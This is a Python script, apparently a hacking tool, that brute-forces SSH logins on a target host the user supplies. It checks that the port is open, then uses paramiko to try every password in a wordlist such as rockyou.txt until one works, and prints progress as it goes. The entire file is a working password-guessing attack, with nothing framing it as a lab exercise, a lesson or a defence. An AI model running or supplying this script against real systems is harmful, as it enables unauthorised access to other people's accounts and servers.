#!/usr/local/bin/python
import paramiko
import socket

target = input('Please enter target IP address: ')
username = input('Please enter username to bruteforce: ')

use_rockyou = input('Do you want to use rockyou.txt for the password file? (y/n)').lower() == 'y'
if use_rockyou:
    password_file = '/usr/share/wordlists/rockyou.txt'
else:
    password_file = input('Please enter location of the password file: ')

def check_ssh_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open on {host}")
            return True
        else:
            print(f"Port {port} is closed on {host}")
            return False
        sock.close()
    except Exception as e:
        print("Error:", e)
        return False

def ssh_connect(password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        return False
    finally:
        ssh.close()

    return True

port = int(input('Please enter the SSH port to use: '))

if not check_ssh_port(target, port):
    print(f"Port {port} is closed on {target}")
    exit(1)

with open(password_file, 'rb') as file:
    passwords = file.readlines()
    total_passwords = len(passwords)

    print("Please wait, trying to brute force...")
    for i, password in enumerate(passwords):
        password = password.strip()

        try:
            if ssh_connect(password, port):
                print('Password found: ' + password.decode("utf-8"))
                break
            else:
                print('No luck with ' + password.decode("utf-8"))
        except Exception as e:
            print(e)
            pass

        percentage = (i + 1) / total_passwords * 100
        print("\033[32mProgress: {:.2f}%\033[0m".format(percentage))


print("Brute force complete.")
